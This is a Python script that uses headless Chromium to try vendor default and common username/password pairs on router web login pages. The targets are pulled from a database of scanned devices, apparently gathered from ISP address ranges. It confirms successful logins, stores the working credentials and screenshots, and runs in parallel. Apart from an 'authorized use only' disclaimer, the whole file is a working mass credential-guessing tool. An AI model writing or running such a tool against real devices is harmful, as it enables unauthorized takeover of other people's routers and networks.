#!/usr/bin/env python3
"""
Router Default Credentials Checker — Playwright (browser) channel
=================================================================
Verifies routers whose login is a JavaScript SPA / applet that raw-HTTP
checking cannot drive (auth_result = 'no-verifiable-channel'). Uses a real
headless Chromium to render the login form, submit credentials and observe
the DOM.

STRICT success rule (no false positives):
  1. A control attempt with a deliberately wrong pair runs FIRST: if the
     password field disappears on the WRONG pair, the device is marked
     "unstable" and skipped (nothing is recorded).
  2. A candidate pair is a success ONLY if the password field disappears
     from the DOM after submit while the control pair kept it visible.
  3. Successful logins are saved into `router_credentials`
     (auth_method='browser') and a screenshot is stored in
     data/routers/shots/ as evidence.

Credentials reuse the same vendor database as router_auth_check.py
(VENDOR_DEFAULTS + GENERIC_POPULAR + data/creds/router_default_creds.csv).

⚠️  AUTHORIZED USE ONLY — security research on devices you own or are
    explicitly allowed to test.

Usage:
    python3 router_auth_browser.py [--pairs N] [--only-no-channel] [--all]
                                   [--limit N] [--dry-run] [--timeout 8]
                                   [--wait 2.5]
"""

import os
import sys
import time
import sqlite3
import argparse
import datetime

import asyncio
from playwright.async_api import async_playwright

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DB_PATH = os.environ.get("ISP_DB_PATH", os.path.join(BASE_DIR, "isp_cidr.db"))
SHOTS_DIR = os.path.join(BASE_DIR, "data", "routers", "shots")

sys.path.insert(0, BASE_DIR)
import router_auth_check as rac  # reuse credential database + helpers

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")


def get_now():
    return datetime.datetime.now(datetime.timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")


# ---------------------------------------------------------------------------
# DB
# ---------------------------------------------------------------------------
def init_db(conn):
    cur = conn.cursor()
    # ensure credentials table (same schema as router_auth_check)
    cur.executescript(rac.INIT_SQL)
    cols = [r[1] for r in cur.execute("PRAGMA table_info(scan_routers)")]
    if "browser_checked" not in cols:
        cur.execute("ALTER TABLE scan_routers ADD COLUMN browser_checked INTEGER DEFAULT 0")
    if "browser_result" not in cols:
        cur.execute("ALTER TABLE scan_routers ADD COLUMN browser_result TEXT")
    if "browser_checked_at" not in cols:
        cur.execute("ALTER TABLE scan_routers ADD COLUMN browser_checked_at TEXT")
    conn.commit()


def fetch_targets(conn, only_no_channel, limit):
    cur = conn.cursor()
    if only_no_channel:
        sql = ("SELECT ip, ip_int, port, vendor, model, device_type, admin_port FROM scan_routers"
               " WHERE browser_checked = 0 AND auth_result = 'no-verifiable-channel'"
               " ORDER BY id ASC")
    else:
        sql = ("SELECT ip, ip_int, port, vendor, model, device_type, admin_port FROM scan_routers"
               " WHERE browser_checked = 0 ORDER BY id ASC")
    if limit:
        sql += " LIMIT ?"
        return cur.execute(sql, (int(limit),)).fetchall()
    return cur.execute(sql).fetchall()


# ---------------------------------------------------------------------------
# Browser helpers
# ---------------------------------------------------------------------------
USERNAME_SELECTORS = [
    "input[autocomplete='username']",
    "input[name*='user' i]",
    "input[id*='user' i]",
    "input[type='text']",
    "input:not([type])",
]
PASSWORD_SELECTOR = "input[type='password']"
SUBMIT_SELECTORS = [
    "button[type='submit']",
    "input[type='submit']",
    "button:has-text('Login')",
    "button:has-text('Log in')",
    "button:has-text('Sign in')",
    "button:has-text('Войти')",
]
FALLBACK_PATHS = ["/webfig/", "/cgi-bin/luci/", "/login.html", "/auth1.html",
                  "/index.html", "/sonicui/7/login/", "/cgi-bin/index.html", "/cgi-bin/home"]


async def find_password_field(page, timeout_ms):
    try:
        await page.wait_for_selector(PASSWORD_SELECTOR, timeout=timeout_ms, state="visible")
        return True
    except Exception:
        return False


async def form_visible(page):
    try:
        el = await page.query_selector(PASSWORD_SELECTOR)
        if el is None:
            return False
        return await el.is_visible()
    except Exception:
        return False


async def submit_login(page, user, pwd, wait_ms, delayed_ms=15000):
    """Fill the login form and submit. Returns 'success' ONLY if:
      1. the password field disappeared after submit,
      2. no login error text is visible on the page,
      3. (delayed auth, e.g. MikroTik WebFig) after delayed_ms the form must
         still be gone and no auth error text visible,
      4. a page reload still shows NO password field (session persisted).
    Returns 'fail' otherwise, 'error' on exception."""
    import re as _re
    try:
        user_el = None
        for sel in USERNAME_SELECTORS:
            user_el = await page.query_selector(sel)
            if user_el:
                break
        pass_el = await page.query_selector(PASSWORD_SELECTOR)
        if pass_el is None:
            return "error"
        if user_el:
            try:
                await user_el.fill(user)
            except Exception:
                pass
        await pass_el.fill(pwd)
        btn = None
        for sel in SUBMIT_SELECTORS:
            btn = await page.query_selector(sel)
            if btn:
                break
        if btn:
            try:
                await btn.click()
            except Exception:
                await pass_el.press("Enter")
        else:
            await pass_el.press("Enter")
        await page.wait_for_timeout(wait_ms)
        # 1. form must be gone
        if await form_visible(page):
            return "fail"
        # 1b. DELAYED AUTH: some devices (MikroTik WebFig) show "Loading" and
        # only then complete auth; a failed login bounces BACK to the login
        # form after ~15s. Wait and re-check, otherwise we record false hits.
        # Only applied when the caller knows the device uses delayed auth.
        if delayed_ms:
            await page.wait_for_timeout(delayed_ms)
            if await form_visible(page):
                return "fail"
        try:
            t_check = await page.evaluate("document.body ? document.body.innerText.slice(0, 3000) : ''")
        except Exception:
            t_check = ""
        if _re.search(r"(?i)(authentication failed|invalid user|failed to log|wrong|неверн|ошибка)", t_check):
            return "fail"
        # 2. no login error text
        try:
            text = await page.evaluate("document.body ? document.body.innerText.slice(0, 2500) : ''")
        except Exception:
            text = ""
        if _re.search(r"(?i)(incorrect|invalid|wrong password|login failed|authentication failed|"
                      r"access denied|unauthor|error|lockout|locked out|too many|blocked|failed|"
                      r"неверн|ошибк|заблокир)", text):
            return "fail"
        # 3. reload must keep the session (no form coming back) AND the page
        #    must show console/dashboard markers (a bare redirect/stub page
        #    without a form is NOT proof of login)
        try:
            await page.reload(wait_until="domcontentloaded", timeout=15000)
        except Exception:
            pass
        await page.wait_for_timeout(3500)
        if await form_visible(page):
            return "fail"
        try:
            text2 = await page.evaluate("document.body ? document.body.innerText.slice(0, 3000) : ''")
        except Exception:
            text2 = ""
        if not _re.search(r"(?i)(dashboard|status|system|logout|sign out|firewall|interface|"
                          r"management|console|settings|network|welcome|home|license|uptime|"
                          r"webfig|routeros)", text2):
            return "fail"
        return "success"
    except Exception:
        return "error"


async def probe_page(browser, ip, port, timeout, admin_port=None):
    """Open the device, locate the login form. Returns (page, context) or None.

    If admin_port is set (management UI on a non-80 port, e.g. SonicWALL on
    1240/443), HTTPS to that port is tried first — modern SonicWALL expose
    their login ONLY via https://ip:admin_port/sonicui/."""
    context = await browser.new_context(user_agent=UA, ignore_https_errors=True)
    page = await context.new_page()

    # 1) admin HTTPS port (modern SonicWALL sonicui etc.)
    if admin_port:
        try:
            await page.goto(f"https://{ip}:{admin_port}/", timeout=timeout * 1000,
                            wait_until="domcontentloaded")
            for p in ["/sonicui/7/login/", "/"]:
                try:
                    await page.goto(f"https://{ip}:{admin_port}{p}", timeout=timeout * 1000,
                                    wait_until="domcontentloaded")
                except Exception:
                    continue
                if await find_password_field(page, 10000):
                    return page, context
        except Exception:
            pass

    # 2) plain HTTP on the scanned port
    base = f"http://{ip}:{port}"
    try:
        await page.goto(base + "/", timeout=timeout * 1000, wait_until="domcontentloaded")
    except Exception:
        pass
    if await find_password_field(page, 15000):
        return page, context
    # fallback paths (WebFig, LuCI, etc.)
    for p in FALLBACK_PATHS:
        try:
            await page.goto(base + p, timeout=timeout * 1000, wait_until="domcontentloaded")
        except Exception:
            continue
        if await find_password_field(page, 8000):
            return page, context
    # 3) HTTPS on the same port
    try:
        await page.goto(f"https://{ip}:{port}/", timeout=timeout * 1000, wait_until="domcontentloaded")
        if await find_password_field(page, 10000):
            return page, context
    except Exception:
        pass
    await context.close()
    return None, None


# ---------------------------------------------------------------------------
# Check one device
# ---------------------------------------------------------------------------
async def check_device(browser, router, pairs, timeout, wait_ms, agent, machine):
    ip, ip_int, port, vendor, model, dtype, admin_port = router
    page, context = await probe_page(browser, ip, port, timeout, admin_port)
    if page is None:
        return ip, {"result": "browser-no-login-form"}, []
    # Delayed auth re-check only for devices known to do it (MikroTik WebFig);
    # other vendors authenticate synchronously, so we skip the 15s stall.
    delayed_ms = 15000 if (vendor or "").lower() == "mikrotik" else 0

    try:
        url_before = page.url

        # --- control: deliberately wrong pair ---
        ctrl = await submit_login(page, "zzz_ctrl", "zzz_wrong_12345", wait_ms, delayed_ms)
        if ctrl == "success":  # wrong creds must NOT log in
            return ip, {"result": "browser-unstable"}, []
        if ctrl == "error":
            return ip, {"result": "browser-unstable"}, []
        # reload fresh login page for real attempts
        try:
            await page.goto(url_before, timeout=timeout * 1000, wait_until="domcontentloaded")
        except Exception:
            pass
        if not await find_password_field(page, 10000):
            return ip, {"result": "browser-unstable"}, []

        found = []
        for user, pwd in pairs:
            ok = await submit_login(page, user, pwd, wait_ms, delayed_ms)
            if ok == "success":
                # success: form disappeared
                try:
                    shot = os.path.join(SHOTS_DIR, f"{ip}_{user}_{pwd or 'blank'}.png")
                    os.makedirs(SHOTS_DIR, exist_ok=True)
                    await page.screenshot(path=shot, full_page=False)
                except Exception:
                    shot = None
                found.append({
                    "ip": ip, "ip_int": ip_int, "port": port, "vendor": vendor,
                    "model": model, "device_type": dtype, "username": user,
                    "password": pwd, "auth_method": "browser",
                    "http_status": 200, "realm": None, "checked_at": get_now(),
                    "agent_id": agent, "machine_id": machine,
                    "screenshot": shot,
                })
                break
            # re-render login page for next attempt
            try:
                await page.goto(url_before, timeout=timeout * 1000, wait_until="domcontentloaded")
            except Exception:
                pass
            if not await find_password_field(page, 10000):
                return ip, {"result": "browser-session-lost"}, found
            await asyncio.sleep(0.7)

        result = "browser-verified" if found else "browser-no-match"
        return ip, {"result": result}, found
    finally:
        try:
            await context.close()
        except Exception:
            pass


# ---------------------------------------------------------------------------
# Orchestration
# ---------------------------------------------------------------------------
async def run(browser, routers, pairs_map, timeout, wait_ms, concurrency, agent, machine):
    sem = asyncio.Semaphore(concurrency)
    results = []
    total = len(routers)
    done = 0
    t0 = time.time()

    async def worker(r):
        nonlocal done
        async with sem:
            ip, meta, found = await check_device(
                browser, r, pairs_map.get(r[3], pairs_map.get("Generic DSL Router", [])),
                timeout, wait_ms, agent, machine)
            results.append((ip, meta, found))
            done += 1
            v = sum(1 for _, m, _ in results if m["result"] == "browser-verified")
            print(f"  🔄 [{done}/{total}] {ip:<16} {r[3] or '-':<14} -> {meta['result']} | verified: {v}")

    await asyncio.gather(*[worker(r) for r in routers])
    print(f"  ✨ Готово за {time.time()-t0:.1f}с")
    return results


def save_results(conn, results):
    cur = conn.cursor()
    n = 0
    for _, meta, found in results:
        for f in found:
            cur.execute("""
                INSERT OR IGNORE INTO router_credentials
                (ip, ip_int, port, vendor, model, device_type, username, password,
                 auth_method, http_status, realm, checked_at, agent_id, machine_id)
                VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?)
            """, (f["ip"], f["ip_int"], f["port"], f["vendor"], f["model"], f["device_type"],
                  f["username"], f["password"], f["auth_method"], f["http_status"],
                  f["realm"], f["checked_at"], f["agent_id"], f["machine_id"]))
            n += 1
    conn.commit()
    return n


def mark_checked(conn, results):
    cur = conn.cursor()
    when = get_now()
    for ip, meta, _ in results:
        cur.execute("UPDATE scan_routers SET browser_checked = 1, browser_result = ?, browser_checked_at = ? WHERE ip = ?",
                    (meta["result"], when, ip))
    conn.commit()


def cleanup_temp_files():
    import glob
    import shutil
    removed = []
    for pat in ["*.db-wal", "*.db-shm", "*.db-journal", "*.tmp", "*.pyc"]:
        for p in glob.glob(os.path.join(BASE_DIR, pat)):
            try:
                os.remove(p)
                removed.append(p)
            except OSError:
                pass
    for p in glob.glob(os.path.join(BASE_DIR, "**", "__pycache__"), recursive=True):
        try:
            shutil.rmtree(p)
            removed.append(p)
        except OSError:
            pass
    print(f"🧹 Очищено временных файлов: {len(removed)}")


def print_stats(conn):
    cur = conn.cursor()
    cur.execute("SELECT COUNT(*) FROM router_credentials")
    total = cur.fetchone()[0]
    cur.execute("SELECT COUNT(*) FROM scan_routers WHERE browser_checked = 1")
    checked = cur.fetchone()[0]
    cur.execute("SELECT COUNT(*) FROM scan_routers")
    all_r = cur.fetchone()[0]
    print(f"\n📊 Проверено браузером: {checked:,}/{all_r:,} | Всего пар в базе: {total}")
    if checked:
        print("\nИтоги браузерных проверок:")
        for r in cur.execute("SELECT browser_result, COUNT(*) c FROM scan_routers WHERE browser_checked = 1 GROUP BY browser_result ORDER BY c DESC"):
            print("  %5d  %s" % (r[1], r[0]))


def main():
    parser = argparse.ArgumentParser(description="Router default credentials checker (Playwright/browser)")
    parser.add_argument("--pairs", type=int, default=15, help="Max credential pairs per device (default 15)")
    parser.add_argument("--only-no-channel", action="store_true", default=True,
                        help="Check only no-verifiable-channel routers (default)")
    parser.add_argument("--all", action="store_true", help="Check ALL not-yet-browser-checked routers")
    parser.add_argument("--limit", type=int, help="Limit number of devices")
    parser.add_argument("--ip", help="Check only this IP (forces re-check)")
    parser.add_argument("--dry-run", action="store_true", help="List targets only")
    parser.add_argument("--timeout", type=float, default=8.0, help="Page load timeout seconds")
    parser.add_argument("--wait", type=float, default=2.5, help="Wait after submit, seconds")
    parser.add_argument("--concurrency", type=int, default=2, help="Parallel devices (default 2)")
    args = parser.parse_args()

    agent = os.environ.get("AGENT_ID", "Agent-Arena-01")
    machine = os.environ.get("MACHINE_ID", "aios-server")

    conn = sqlite3.connect(DB_PATH)
    init_db(conn)
    if args.ip:
        cur = conn.cursor()
        targets = cur.execute("SELECT ip, ip_int, port, vendor, model, device_type, admin_port FROM scan_routers WHERE ip = ?", (args.ip,)).fetchall()
        if targets:
            cur.execute("UPDATE scan_routers SET browser_checked = 0, browser_result = NULL WHERE ip = ?", (args.ip,))
            conn.commit()
    else:
        targets = fetch_targets(conn, only_no_channel=not args.all, limit=args.limit)
    if not targets:
        print("ℹ️ Нет целей для браузерной проверки.")
        print_stats(conn)
        conn.close()
        return

    print(f"🔍 Целей для браузерной проверки: {len(targets)}")
    for r in targets:
        print(f"   {r[0]:<16} {r[3] or '-':<18} {r[4] or '-'}")
    if args.dry_run:
        conn.close()
        return

    extra = rac.load_extra_creds()
    pairs_map = {}
    for r in targets:
        pairs_map[r[3]] = rac.creds_for(r[3], extra)[:args.pairs]

    print(f"\n⚡ Запуск Playwright-проверки ({args.concurrency} параллельно, до {args.pairs} пар на устройство)...")
    t0 = time.time()
    asyncio.run(_main_async(pairs_map, targets, args, agent, machine))
    print(f"  ⏱ всего: {time.time()-t0:.1f}с")

    conn.close()
    print_stats(sqlite3.connect(DB_PATH))
    cleanup_temp_files()
    print("\n🏁 Готово. Найденные пары в router_credentials (auth_method='browser'), скриншоты в data/routers/shots/")


async def _main_async(pairs_map, targets, args, agent, machine):
    async with async_playwright() as pw:
        browser = await pw.chromium.launch(headless=True, args=["--no-sandbox"])
        try:
            results = await run(browser, targets, pairs_map, args.timeout,
                                int(args.wait * 1000), args.concurrency, agent, machine)
        finally:
            await browser.close()
    conn = sqlite3.connect(DB_PATH)
    n = save_results(conn, results)
    mark_checked(conn, results)
    conn.close()
    print(f"\n✅ Верифицированных пар сохранено: {n}")


if __name__ == "__main__":
    main()
